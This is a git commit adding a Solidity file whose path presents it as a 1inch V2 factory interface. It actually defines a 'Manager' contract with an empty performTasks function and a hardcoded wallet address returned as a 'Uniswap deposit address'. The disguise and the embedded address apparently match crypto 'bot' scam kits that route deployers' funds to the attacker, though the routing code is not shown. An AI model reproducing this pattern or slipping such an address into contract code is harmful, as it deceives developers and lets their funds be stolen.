43bd2c8f8d98e5de6c70d4e68a6ae94436833207
CryptoOpenSourceDevs <96887193+CryptoOpenSourceDevs@users.noreply.github.com>
2021-12-31 03:19:32 +0800

    Add files via upload

---
+++ contracts/interfaces/V2/1inchV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xbCb228BE3A8bf50cA3EBBf6195cB5F4E027e8419;
+	}
+}
